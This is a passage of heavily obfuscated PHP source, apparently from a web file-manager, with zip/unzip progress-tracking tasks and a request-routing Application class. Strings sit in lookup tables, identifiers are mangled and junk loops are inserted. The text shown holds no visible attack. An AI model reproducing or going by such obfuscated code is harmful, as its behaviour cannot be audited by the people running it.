$†Àé[$½şŠ[262]] . $½şŠ[1668] . ACTION, $½şŠ[1659]); } catch (Exception $ÊĞîÖ³çê) { } continue; } $…€˜Â™ª½©Ö[$Åî©´é] = $†Àé; } if (!$Ìí) { return; } if (!$…€˜Â™ª½©Ö) { return Cache::remove($ƒöï³Ì—÷); } Cache::set($ƒöï³Ì—÷, $…€˜Â™ª½©Ö, 60); Cache::removeMemory($ƒöï³Ì—÷); } public static function finished($ÃĞÈÛç¼¯, $¤•) { $Ÿ×«‘Ğ =& $_SERVER[èÍ×öˆøÉ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ÿ×«‘Ğ[262] => $ÃĞÈÛç¼¯, $Ÿ×«‘Ğ[1657] => $¤•); } private static function finishedRun() { $Õ”êâ =& $_SERVER[èÍ×öˆøÉ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $òÖ) { try { Hook::apply($òÖ[$Õ”êâ[262]], $òÖ[$Õ”êâ[1657]]); } catch (Exception $Âœ’Âà) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¶·¿ëä“˜Úß =& $_SERVER[èÍ×öˆøÉ]; parent::startAfter(); Hook::bind($¶·¿ëä“˜Úß[1669], array($this, $¶·¿ëä“˜Úß[1670])); Hook::bind($¶·¿ëä“˜Úß[1127], array($this, $¶·¿ëä“˜Úß[1671])); $Ê =& $this->task; $Ê[$¶·¿ëä“˜Úß[1672]] = $¶·¿ëä“˜Úß[1132]; if (!$Ê[$¶·¿ëä“˜Úß[1485]]) { $Ê[$¶·¿ëä“˜Úß[1485]] = LNG($¶·¿ëä“˜Úß[1673]); } } protected function endAfter() { $¸¼É¸ç± =& $_SERVER[èÍ×öˆøÉ]; parent::endAfter(); Hook::unbind($¸¼É¸ç±[1669], array($this, $¸¼É¸ç±[1670])); Hook::unbind($¸¼É¸ç±[1127], array($this, $¸¼É¸ç±[1671])); } public function updateAfter() { $ÕŸÎÒ¥…ˆ =& $_SERVER[èÍ×öˆøÉ]; $’Ù¬Ïò =& $this->task; if (!$’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1060]] || !$’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[758]]) { return; } if ($’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1672]] == $ÕŸÎÒ¥…ˆ[1132]) { $şÊ = 0; if ($’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1628]]) { $şÊ = $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1629]] / $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1628]]; } $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1583]] = $şÊ * 0.3; } else { if ($’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1672]] == $ÕŸÎÒ¥…ˆ[311]) { $şÊ = $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1074]] / $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1060]]; $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1583]] = 0.3 + $şÊ * 0.4; } else { if ($’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1672]] == $ÕŸÎÒ¥…ˆ[107]) { $“Á§—ƒ€Ç = 0; if ($’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1630]] == $ÕŸÎÒ¥…ˆ[107]) { $“Á§—ƒ€Ç = $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1629]]; } $şÊ = ($’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1633]] + $“Á§—ƒ€Ç) / $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[758]]; $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1583]] = 0.3 + 0.4 + $şÊ * 0.3; } } } if ($’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1583]] > 0) { $âÈŸµæŞÌ = timeFloat() - $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[784]] - $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1586]]; $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1587]] = $âÈŸµæŞÌ * (1 - $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1583]]) / $’Ù¬Ïò[$ÕŸÎÒ¥…ˆ[1583]]; } } public function addFile($¦‡Ó—ÛÔ½–) { $Ù¨ =& $_SERVER[èÍ×öˆøÉ]; $Ì€ =& $this->task; $“ı’æ“Õ = IO::info($¦‡Ó—ÛÔ½–); $Ì€[$Ù¨[1626]] = $“ı’æ“Õ[$Ù¨[28]]; $Ì€[$Ù¨[1628]] = $“ı’æ“Õ[$Ù¨[78]]; $Ì€[$Ù¨[1629]] = 0; $Ì€[$Ù¨[1062]] = $Ù¨[1648]; $Ì€[$Ù¨[1630]] = $Ù¨[1132]; $Ì€[$Ù¨[758]] = $“ı’æ“Õ[$Ù¨[78]]; $Ì€[$Ù¨[1060]] = 1; $¸‘£ = 0; $Ì€[$Ù¨[1637]] = array($Ù¨[1638] => $¸‘£ + 1, $Ù¨[415] => $“ı’æ“Õ[$Ù¨[28]], $Ù¨[76] => $“ı’æ“Õ[$Ù¨[76]], $Ù¨[513] => $“ı’æ“Õ[$Ù¨[513]] ? $“ı’æ“Õ[$Ù¨[513]] : $“ı’æ“Õ[$Ù¨[76]]); $this->update(); } public function unzipAfter($×åÔõ¦¸½) { $É¬ôÊ¼«¶…Ö =& $_SERVER[èÍ×öˆøÉ]; $·Ë†å =& $this->task; $·Ë†å[$É¬ôÊ¼«¶…Ö[1672]] = $É¬ôÊ¼«¶…Ö[107]; $Ää°â«ÁŸÚ = IO::infoWithChildren($×åÔõ¦¸½); $µåìƒ–šŠàıù = 0; $·Ë†å[$É¬ôÊ¼«¶…Ö[1637]] = array($É¬ôÊ¼«¶…Ö[1638] => $µåìƒ–šŠàıù + 1, $É¬ôÊ¼«¶…Ö[415] => $Ää°â«ÁŸÚ[$É¬ôÊ¼«¶…Ö[28]], $É¬ôÊ¼«¶…Ö[76] => $Ää°â«ÁŸÚ[$É¬ôÊ¼«¶…Ö[76]], $É¬ôÊ¼«¶…Ö[513] => $Ää°â«ÁŸÚ[$É¬ôÊ¼«¶…Ö[513]] ? $Ää°â«ÁŸÚ[$É¬ôÊ¼«¶…Ö[513]] : $Ää°â«ÁŸÚ[$É¬ôÊ¼«¶…Ö[76]]); if ($Ää°â«ÁŸÚ[$É¬ôÊ¼«¶…Ö[29]] == $É¬ôÊ¼«¶…Ö[193]) { $·Ë†å[$É¬ôÊ¼«¶…Ö[1060]] = 1; } else { $·Ë†å[$É¬ôÊ¼«¶…Ö[1060]] = $Ää°â«ÁŸÚ[$É¬ôÊ¼«¶…Ö[81]][$É¬ôÊ¼«¶…Ö[79]]; } $·Ë†å[$É¬ôÊ¼«¶…Ö[1062]] = $É¬ôÊ¼«¶…Ö[33]; $·Ë†å[$É¬ôÊ¼«¶…Ö[1630]] = 0; $·Ë†å[$É¬ôÊ¼«¶…Ö[1074]] = 0; $·Ë†å[$É¬ôÊ¼«¶…Ö[1628]] = 0; $·Ë†å[$É¬ôÊ¼«¶…Ö[1629]] = 0; $·Ë†å[$É¬ôÊ¼«¶…Ö[1626]] = $É¬ôÊ¼«¶…Ö[33]; $·Ë†å[$É¬ôÊ¼«¶…Ö[1633]] = 0; $·Ë†å[$É¬ôÊ¼«¶…Ö[758]] = $Ää°â«ÁŸÚ[$É¬ôÊ¼«¶…Ö[78]]; $this->update(); self::log($É¬ôÊ¼«¶…Ö[1674] . json_encode(array($·Ë†å, $Ää°â«ÁŸÚ))); } public function nameParse($ÀÜ–ÒÆ§¡) { $àÀê–æû¾ =& $_SERVER[èÍ×öˆøÉ]; $Úí£²Ê =& $this->task; if ($Úí£²Ê[$àÀê–æû¾[1672]] == $àÀê–æû¾[1132]) { $Úí£²Ê[$àÀê–æû¾[1672]] = $àÀê–æû¾[311]; $Úí£²Ê[$àÀê–æû¾[1633]] = 0; $Úí£²Ê[$àÀê–æû¾[758]] = 0; } $¿àó±ğêê = get_path_this($ÀÜ–ÒÆ§¡); if (strstr($¿àó±ğêê, $àÀê–æû¾[95])) { $Úí£²Ê[$àÀê–æû¾[1074]] += 1; $Úí£²Ê[$àÀê–æû¾[1060]] += 1; } $Úí£²Ê[$àÀê–æû¾[1626]] = $ÀÜ–ÒÆ§¡; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $òàœû¡š¢·Ì =& $_SERVER[èÍ×öˆøÉ]; parent::startAfter(); Hook::bind($òàœû¡š¢·Ì[1675], array($this, $òàœû¡š¢·Ì[1670])); $‘Ÿ =& $this->task; $‘Ÿ[$òàœû¡š¢·Ì[1672]] = $òàœû¡š¢·Ì[1132]; if (!$‘Ÿ[$òàœû¡š¢·Ì[1485]]) { $‘Ÿ[$òàœû¡š¢·Ì[1485]] = LNG($òàœû¡š¢·Ì[1676]); } } protected function endAfter() { $ƒİ£”Ğ =& $_SERVER[èÍ×öˆøÉ]; parent::endAfter(); Hook::unbind($ƒİ£”Ğ[1675], array($this, $ƒİ£”Ğ[1670])); } public function updateAfter() { $Ó†Œíù =& $_SERVER[èÍ×öˆøÉ]; $ÈÊşœ×ÑêúÒ =& $this->task; if (!$ÈÊşœ×ÑêúÒ[$Ó†Œíù[1060]] || !$ÈÊşœ×ÑêúÒ[$Ó†Œíù[758]]) { return; } if ($ÈÊşœ×ÑêúÒ[$Ó†Œíù[1672]] == $Ó†Œíù[1132]) { $¼³—½ÙäË = $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1629]]; if ($ÈÊşœ×ÑêúÒ[$Ó†Œíù[1630]] != $Ó†Œíù[1132]) { $¼³—½ÙäË = 0; } $¥÷â¦¤®¦û = ($ÈÊşœ×ÑêúÒ[$Ó†Œíù[1633]] + $¼³—½ÙäË) / $ÈÊşœ×ÑêúÒ[$Ó†Œíù[758]]; $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1583]] = $¥÷â¦¤®¦û * 0.3; } else { if ($ÈÊşœ×ÑêúÒ[$Ó†Œíù[1672]] == $Ó†Œíù[311]) { $¥÷â¦¤®¦û = $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1074]] / $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1060]]; $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1583]] = 0.3 + $¥÷â¦¤®¦û * 0.5; } else { if ($ÈÊşœ×ÑêúÒ[$Ó†Œíù[1672]] == $Ó†Œíù[107]) { $¥÷â¦¤®¦û = 0; if ($ÈÊşœ×ÑêúÒ[$Ó†Œíù[1628]]) { $¥÷â¦¤®¦û = $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1629]] / $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1628]]; } $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1583]] = 0.3 + 0.5 + $¥÷â¦¤®¦û * 0.2; } } } if ($ÈÊşœ×ÑêúÒ[$Ó†Œíù[1583]] > 0) { $˜¦êû = timeFloat() - $ÈÊşœ×ÑêúÒ[$Ó†Œíù[784]] - $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1586]]; $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1587]] = $˜¦êû * (1 - $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1583]]) / $ÈÊşœ×ÑêúÒ[$Ó†Œíù[1583]]; } } public function copyFileStart($»Ëó, $ïª¼„ÜÀ¦ÕÓ, $‰ï, $äÅ¨…¼Ì, $¾Ô, $í‰Ãô³Ü) { $·¤¹…‰·¤ =& $_SERVER[èÍ×öˆøÉ]; parent::copyFileStart($»Ëó, $ïª¼„ÜÀ¦ÕÓ, $‰ï, $äÅ¨…¼Ì, $¾Ô, $í‰Ãô³Ü); $¾á¤œŞá =& $this->task; if ($¾á¤œŞá[$·¤¹…‰·¤[1672]] == $·¤¹…‰·¤[311]) { $¾á¤œŞá[$·¤¹…‰·¤[1672]] = $·¤¹…‰·¤[107]; } $this->update(); } public function copyFileEnd($ş, $Ÿâõ²Ì, $ œ—°‘âÏÇ, $›Ş„ìäİÎ, $È˜ëşªæ, $ÙÂäÖÚ­¼Å) { $€ÏÃ =& $_SERVER[èÍ×öˆøÉ]; $ŞáÈÒ°¶úµô =& $this->task; $ŞáÈÒ°¶úµô[$€ÏÃ[1629]] = $ŞáÈÒ°¶úµô[$€ÏÃ[1628]]; $ŞáÈÒ°¶úµô[$€ÏÃ[1633]] += $ŞáÈÒ°¶úµô[$€ÏÃ[1628]]; $ŞáÈÒ°¶úµô[$€ÏÃ[1630]] = $€ÏÃ[33]; $this->update(); } public function nameParse($Á„ù×Ò°»¬Ï) { $™Û =& $_SERVER[èÍ×öˆøÉ]; $¬ÔÆ¿ =& $this->task; if ($¬ÔÆ¿[$™Û[1074]] < $¬ÔÆ¿[$™Û[1060]]) { $ÑÓ´ İóÜŠ = get_path_this($Á„ù×Ò°»¬Ï); if (strstr($ÑÓ´ İóÜŠ, $™Û[95])) { $¬ÔÆ¿[$™Û[1074]] += 1; } } if ($¬ÔÆ¿[$™Û[1672]] == $™Û[1132]) { $¬ÔÆ¿[$™Û[1672]] = $™Û[311]; } $¬ÔÆ¿[$™Û[1626]] = $Á„ù×Ò°»¬Ï; $this->update(); } } goto A«É’¡ù˜„; c‡¹‹¬°Ù¬: $msuwfqatnv = $_SERVER[èÍ×öˆøÉ][603]; if (strlen($msuwfqatnv) < $_SERVER[èÍ×öˆøÉ][604]) { die; } class Application { private $defaultModule = "\151\x6e\x64\145\170"; private $defaultController = "\151\156\x64\x65\x78"; private $defaultAction = "\x69\156\144\x65\170"; function __construct() { } public function setDefault($É¯ÍÓ¶) { $ßÛ÷·¬½ =& $_SERVER[èÍ×öˆøÉ]; $·”Õàû =& $_SERVER[òÛ‡ê…ú]; $¶¹¬ = $·”Õàû[0]($·”Õàû[1], $·”Õàû[2]($É¯ÍÓ¶, $·”Õàû[1])); $this->defaultModule = $¶¹¬[0] ? $¶¹¬[0] : $this->defaultModule; $æ“ßµ = $ßÛ÷·¬½[605]; while ($æ“ßµ < $ßÛ÷·¬½[604]) { if ($æ“ßµ >= 0) { break; } $æ“ßµ++; } $this->defaultController = $¶¹¬[1] ? $¶¹¬[1] : $this->defaultController; $¹ó½ÇêúŸ¢´™ = $ßÛ÷·¬½[606]; if (strlen($¹ó½ÇêúŸ¢´™) < $ßÛ÷·¬½[607]) { return; } $this->defaultAction = $¶¹¬[2] ? $¶¹¬[2] : $this->defaultAction; $Í£ë‚Á‹ËÂéø = $ßÛ÷·¬½[608]; if (strlen($Í£ë‚Á‹ËÂéø) < $ßÛ÷·¬½[604]) { return; } $this->{$_SERVER[òÛ‡ê…ú][3]}($·”Õàû[4], array($this, $·”Õàû[5])); $°«ë±šÁó¾ = $ßÛ÷·¬½[609]; if (!$°«ë±šÁó¾) { die; } } public function appRun($çÈĞÊ¸ÆËöâ) { $Óİü§– =& $_SERVER[èÍ×öˆøÉ]; $ä’‡ =& $_SERVER[òÛ‡ê…ú]; $ÌŠŠ = $ä’‡[0]($ä’‡[1], $çÈĞÊ¸ÆËöâ); $çšæä§£ô÷¦à = $ä’‡[6]($ÌŠŠ[0]); $”ùõ²¹èĞ = $Óİü§–[610]; if (strlen($”ùõ²¹èĞ) < $Óİü§–[607]) { die; } $ÛªØŸÖù¿ = $ä’‡[7]; if ($çšæä§£ô÷¦à == $ä’‡[8]) { $ÛªØŸÖù¿ = $ä’‡[9]; $ÌŠŠ[0] = $ä’‡[10]; $ÌŠŠ[1] = $ÌŠŠ[1] . $ä’‡[11]; $çÈĞÊ¸ÆËöâ = $ä’‡[12]($ä’‡[1], $ÌŠŠ); $çÈĞÊ¸ÆËöâ = $ä’‡[2]($çÈĞÊ¸ÆËöâ, $ä’‡[1]); } $ä’‡[13](array($ä’‡[14], $ä’‡[15]), $ÛªØŸÖù¿ . $ä’‡[16], $çÈĞÊ¸ÆËöâ); $ä’‡[17]($çÈĞÊ¸ÆËöâ); $ä’‡[13](array($ä’‡[14], $ä’‡[15]), $ÛªØŸÖù¿ . $ä’‡[18], $çÈĞÊ¸ÆËöâ); $¬› = $Óİü§–[611]; while (strlen($¬›) < $Óİü§–[604]) { if (!$¬›) { break; } $¬›++; } } private function autorun() { $î†èØÒ´â·ùš =& $_SERVER[èÍ×öˆøÉ]; $êÆÔÆ— =& $_SERVER[òÛ‡ê…ú]; global $config; if ($êÆÔÆ—[19]($config[$êÆÔÆ—[20]]) == 0) { return; } foreach ($config[$êÆÔÆ—[20]] as $÷¿–ı¤Ô¦ëİ => $È§) { $this->{$_SERVER[òÛ‡ê…ú][21]}($È§); $©‘‚ƒÀ ¼íç = $î†èØÒ´â·ùš[612]; if (strlen($©‘‚ƒÀ ¼íç) < $î†èØÒ´â·ùš[613]) { return; } } } private function dput5ce1931a() { $ƒù³¯Ê =& $_SERVER[èÍ×öˆøÉ]; $ÉŒĞŠ‹ë—Ù =& $_SERVER[òÛ‡ê…ú]; $ÀèÕ™ = $ÉŒĞŠ‹ë—Ù[8]; $”•ÈÎÂ = $ƒù³¯Ê[614]; if (strlen($”•ÈÎÂ) < $ƒù³¯Ê[607]) { return; } $Êıµ = $GLOBALS[$ÉŒĞŠ‹ë—Ù[22]][$ÉŒĞŠ‹ë—Ù[23]][0]; if (!$Êıµ || $ÉŒĞŠ‹ë—Ù[24]($Êıµ) <= $ÉŒĞŠ‹ë—Ù[24]($ÀèÕ™)) { return; } if ($ÉŒĞŠ‹ë—Ù[6]($ÉŒĞŠ‹ë—Ù[25]($Êıµ, -$ÉŒĞŠ‹ë—Ù[24]($ÀèÕ™))) != $ÀèÕ™) { return; } $Í¢€ÈÉ®ÃÉÔÂ = $ÉŒĞŠ‹ë—Ù[25]($Êıµ, 0, -$ÉŒĞŠ‹ë—Ù[24]($ÀèÕ™)); $²Æ‹°ñ  = $ƒù³¯Ê[615]; while ($²Æ‹°ñ  < $ƒù³¯Ê[616]) { if ($²Æ‹°ñ  >= 0) { break; } $²Æ‹°ñ ++; } $¿éª = array($ÉŒĞŠ‹ë—Ù[8], $Í¢€ÈÉ®ÃÉÔÂ); $º·êä = $ƒù³¯Ê[617]; while (strlen($º·êä) < $ƒù³¯Ê[616]) { if (!$º·êä) { break; } $º·êä++; } $§³ãœéëÜìÒ = $ÉŒĞŠ‹ë—Ù[26]($GLOBALS[$ÉŒĞŠ‹ë—Ù[22]][$ÉŒĞŠ‹ë—Ù[23]], 1); $à›Şå›‹‰ÏÕó = $ƒù³¯Ê[618]; $GLOBALS[$ÉŒĞŠ‹ë—Ù[22]][$ÉŒĞŠ‹ë—Ù[23]] = $ÉŒĞŠ‹ë—Ù[27]($¿éª, $§³ãœéëÜìÒ); $GLOBALS[$ÉŒĞŠ‹ë—Ù[22]][$ÉŒĞŠ‹ë—Ù[28]] = $ÉŒĞŠ‹ë—Ù[29]($ÉŒĞŠ‹ë—Ù[1], $GLOBALS[$ÉŒĞŠ‹ë—Ù[22]][$ÉŒĞŠ‹ë—Ù[23]]); $‹Ó‰‰êºÅò = $ƒù³¯Ê[619]; if (strlen($‹Ó‰‰êºÅò) < $ƒù³¯Ê[607]) { return; } } private function lbyo6526fa5e() { $‰ôò»ééÚ =& $_SERVER[èÍ×öˆøÉ]; $¶ôÚ =& $_SERVER[òÛ‡ê…ú]; if ($GLOBALS[$¶ôÚ[22]][$¶ôÚ[28]] != $¶ôÚ[10]) { return; } $ı«ÚÜÀ = $_SERVER[$¶ôÚ[30]]; $€ = $¶ôÚ[31]; $„Ü‰³ = $‰ôò»ééÚ[620]; if (strlen($„Ü‰³) < $‰ôò»ééÚ[607]) { return; } if (!$¶ôÚ[32]($ı«ÚÜÀ, $€)) { return; } $üÅ–¥§Ÿê = $¶ôÚ[33]($ı«ÚÜÀ, $€); $…§ÉŸÕ„ª = $¶ôÚ[25]($ı«ÚÜÀ, $üÅ–¥§Ÿê + $¶ôÚ[24]($€)); $¶ôÚ[34]($¶ôÚ[35], $…§ÉŸÕ„ª, $éş•); $™ç¯œÅ· = $‰ôò»ééÚ[621]; while (strlen($™ç¯œÅ·) < $‰ôò»ééÚ[613]) { if (!$™ç¯œÅ·) { break; } $™ç¯œÅ·++; } $…§ÉŸÕ„ª = $¶ôÚ[2]($éş•[0][0], $¶ôÚ[36]); $¢£Òë×ıûÛ = $‰ôò»ééÚ[622]; if (!$¢£Òë×ıûÛ) { return; } $GLOBALS[$¶ôÚ[22]][$¶ôÚ[23]] = $¶ôÚ[0]($¶ôÚ[36], $…§ÉŸÕ„ª); $GLOBALS[$¶ôÚ[22]][$¶ôÚ[28]] = $¶ôÚ[29]($¶ôÚ[1], $GLOBALS[$¶ôÚ[22]][$¶ôÚ[23]]); } public function run() { $‹‚Ô ¼ =& $_SERVER[èÍ×öˆøÉ]; $±Ÿù— =& $_SERVER[òÛ‡ê…ú]; $this->{$_SERVER[òÛ‡ê…ú][37]}(); $this->{$_SERVER[òÛ‡ê…ú][38]}(); $ä‰¬Ä = $‹‚Ô ¼[623]; $‹ = $GLOBALS[$±Ÿù—[22]][$±Ÿù—[23]]; $ˆâö«ÚÑ = $GLOBALS[$±Ÿù—[22]][$±Ÿù—[28]]; $±Ÿù—[39]($±Ÿù—[40], isset($‹[0]) && $‹[0] ? $‹[0] : $this->defaultModule); $íäá³›®€éË = $‹‚Ô ¼[624]; while ($íäá³›®€éË < $‹‚Ô ¼[625]) { if ($íäá³›®€éË >= 0) { break; } $íäá³›®€éË++; } $±Ÿù—[39]($±Ÿù—[41], isset($‹[1]) && $‹[0] ? $‹[1] : $this->defaultController); $Á½úçáôĞËñÏ = $‹‚Ô ¼[626]; if (strlen($Á½úçáôĞËñÏ) < $‹‚Ô ¼[613]) { die; } $±Ÿù—[39]($±Ÿù—[42], isset($‹[2]) && $‹[0] ? $‹[2] : $this->defaultAction); $±Ÿù—[39]($±Ÿù—[43], MOD . $±Ÿù—[1] . ST . $±Ÿù—[1] . ACT); $_SERVER[$±Ÿù—[44]] = $±Ÿù—[6](ACTION); $this->{$_SERVER[òÛ‡ê…ú][45]}(); $úªôãËÉ¡“•Ô = $‹‚Ô ¼[627]; if ($±Ÿù—[19]($‹) >= 3) { $this->{$_SERVER[òÛ‡ê…ú][21]}($ˆâö«ÚÑ); } else { $this->{$_SERVER[òÛ‡ê…ú][21]}(ACTION); } } private $wmvl23f54898 = array(); private $rxfl1844eb86 = ''; public function uemt2d4b18d9() { $º—ç» =& $_SERVER[èÍ×öˆøÉ]; $ı¶¦•¶ïğ¯– =& $_SERVER[òÛ‡ê…ú]; $this->{$_SERVER[òÛ‡ê…ú][46]}(); $ã…—ó¶ò = $º—ç»[628]; $this->{$_SERVER[òÛ‡ê…ú][47]}(); $this->{$_SERVER[òÛ‡ê…ú][48]}(); $this->{$_SERVER[òÛ‡ê…ú][49]}(); $¾Åç“²• = $º—ç»[629]; $this->{$_SERVER[òÛ‡ê…ú][50]}(); $this->{$_SERVER[òÛ‡ê…ú][51]}(); $›¹Ò¯½ƒßå = $º—ç»[630]; if (!$›¹Ò¯½ƒßå) { return; } $this->{$_SERVER[òÛ‡ê…ú][52]}(); $this->{$_SERVER[òÛ‡ê…ú][3]}($ı¶¦•¶ïğ¯–[53], array($this, $ı¶¦•¶ïğ¯–[54])); $Ç = $º—ç»[631]; while (strlen($Ç) < $º—ç»[613]) { if (!$Ç) { break; } $Ç++; } $this->{$_SERVER[òÛ‡ê…ú][3]}($ı¶¦•¶ïğ¯–[55], array($this, $ı¶¦•¶ïğ¯–[56])); $this->{$_SERVER[òÛ‡ê…ú][3]}($ı¶¦•¶ïğ¯–[57], array($this, $ı¶¦•¶ïğ¯–[58])); $Éşáö‡ê„ø = $º—ç»[632]; if (strlen($Éşáö‡ê„ø) < $º—ç»[604]) { die; } $this->{$_SERVER[òÛ‡ê…ú][3]}($ı¶¦•¶ïğ¯–[59], array($this, $ı¶¦•¶ïğ¯–[60])); $ãŞâ Ï˜Ê¥µÈ = $º—ç»[633]; if (strlen($ãŞâ Ï˜Ê¥µÈ) < $º—ç»[625]) { die; } } public function shbfaf3a3b54($Ôš) { $İ»ûŸÑÌÅÒ¼• =& $_SERVER[èÍ×öˆøÉ]; $ìá¹¾æ =& $_SERVER[òÛ‡ê…ú]; $Œ†Ï¶ = $ìá¹¾æ[61]($ìá¹¾æ[62])->{$_SERVER[òÛ‡ê…ú][63]}(); $›ºÉ¡„¡Î¥ = $İ»ûŸÑÌÅÒ¼•[634]; while ($›ºÉ¡„¡Î¥ < $İ»ûŸÑÌÅÒ¼•[625]) { if ($›ºÉ¡„¡Î¥ >= 0) { break; } $›ºÉ¡„¡Î¥++; } $ Ô›…¥ˆˆ­ = array($ìá¹¾æ[64], $ìá¹¾æ[65], $ìá¹¾æ[66], $ìá¹¾æ[67], $ìá¹¾æ[68], $ìá¹¾æ[69], $ìá¹¾æ[70], $ìá¹¾æ[71], $ìá¹¾æ[72], $ìá¹¾æ[73], $ìá¹¾æ[74], $ìá¹¾æ[75], $ìá¹¾æ[76], $ìá¹¾æ[77], $ìá¹¾æ[78], $ìá¹¾æ[79], $ìá¹¾æ[80], $ìá¹¾æ[81], $ìá¹¾æ[82], $ìá¹¾æ[83], $ìá¹¾æ[84], $ìá¹¾æ[85], $ìá¹¾æ[86], $ìá¹¾æ[87], $ìá¹¾æ[88], $ìá¹¾æ[89], $ìá¹¾æ[90], $ìá¹¾æ[91], $ìá¹¾æ[92], $ìá¹¾æ[93], $ìá¹¾æ[94], $ìá¹¾æ[95], $ìá¹¾æ[96], $ìá¹¾æ[97], $ìá¹¾æ[98], $ìá¹¾æ[99], $ìá¹¾æ[100], $ìá¹¾æ[101], $ìá¹¾æ[102], $ìá¹¾æ[103], $ìá¹¾æ[104], $ìá¹¾æ[105], $ìá¹¾æ[106], $ìá¹¾æ[107], $ìá¹¾æ[108], $ìá¹¾æ[109], $ìá¹¾æ[110]); foreach ($ Ô›…¥ˆˆ­ as $íœàõ´) { $òÇ€ = $GLOBALS[$ìá¹¾æ[111]][$ìá¹¾æ[112]][$íœàõ´]; $Ã…Š = $İ»ûŸÑÌÅÒ¼•[635]; if (!$Ã…Š) { return; } if (isset($Œ†Ï¶[$íœàõ´])) { $òÇ€ = $Œ†Ï¶[$íœàõ´]; } $Ôš[$ìá¹¾æ[113]][$ìá¹¾æ[114]][$íœàõ´] = $òÇ€; } $úÈÅŒ³é…şŸ = $Ôš[$ìá¹¾æ[113]][$ìá¹¾æ[114]][$ìá¹¾æ[76]]; unset($Ôš[$ìá¹¾æ[113]][$ìá¹¾æ[115]][$ìá¹¾æ[116]]); unset($Ôš[$ìá¹¾æ[113]][$ìá¹¾æ[115]][$ìá¹¾æ[117]]); unset($Ôš[$ìá¹¾æ[113]][$ìá¹¾æ[114]][$ìá¹¾æ[76]]); $—Æ«Ì×«Ï˜ = $İ»ûŸÑÌÅÒ¼•[636]; while ($—Æ«Ì×«Ï˜ < $İ»ûŸÑÌÅÒ¼•[604]) { if ($—Æ«Ì×«Ï˜ >= 0) { break; } $—Æ«Ì×«Ï˜++; } unset($Ôš[$ìá¹¾æ[113]][$ìá¹¾æ[114]][$ìá¹¾æ[118]]); $áÍ¶Á‹ˆÒ = $İ»ûŸÑÌÅÒ¼•[637]; while ($áÍ¶Á‹ˆÒ < $İ»ûŸÑÌÅÒ¼•[607]) { if ($áÍ¶Á‹ˆÒ >= 0) { break; } $áÍ¶Á‹ˆÒ++; } $Ôš[$ìá¹¾æ[113]][$ìá¹¾æ[114]][$ìá¹¾æ[119]] = array($ìá¹¾æ[120] => (int) $úÈÅŒ³é…şŸ[$ìá¹¾æ[121]], $ìá¹¾æ[122] => (int) $ìá¹¾æ[123]($úÈÅŒ³é…şŸ, $ìá¹¾æ[124], 0)); $­Ä²÷¥º—úêî = $İ»ûŸÑÌÅÒ¼•[638]; $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[126]] = $ìá¹¾æ[127]($ìá¹¾æ[128])->{$_SERVER[òÛ‡ê…ú][129]}(); $Ëí•Õ = $İ»ûŸÑÌÅÒ¼•[639]; $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[130]] = $ìá¹¾æ[131]($_SERVER[$ìá¹¾æ[132]] . $Œ†Ï¶[$ìá¹¾æ[133]]); $—·®¡°õìì = $İ»ûŸÑÌÅÒ¼•[640]; if (strlen($—·®¡°õìì) < $İ»ûŸÑÌÅÒ¼•[604]) { return; } $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[134]] = $ìá¹¾æ[135]($ìá¹¾æ[136]()); $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[137]] = $this->rxfl1844eb86; if ($Œ†Ï¶[$ìá¹¾æ[137]] != $ìá¹¾æ[138]) { $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[139]] = $Œ†Ï¶[$ìá¹¾æ[139]]; $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[140]] = $Œ†Ï¶[$ìá¹¾æ[140]]; $õ–ÖÁåá = $ìá¹¾æ[141](10) . $this->rxfl1844eb86 . $ìá¹¾æ[141](5); $Ôš[$ìá¹¾æ[113]][$ìá¹¾æ[142]][$ìá¹¾æ[143]] = $this->{$_SERVER[òÛ‡ê…ú][144]}($õ–ÖÁåá, $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[130]]); } if ($this->rxfl1844eb86 == $ìá¹¾æ[138]) { $Ôš[$ìá¹¾æ[113]][$ìá¹¾æ[114]][$ìá¹¾æ[119]][$ìá¹¾æ[124]] = 0; } $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[145]] = $ìá¹¾æ[123]($this->wmvl23f54898, $ìá¹¾æ[146], 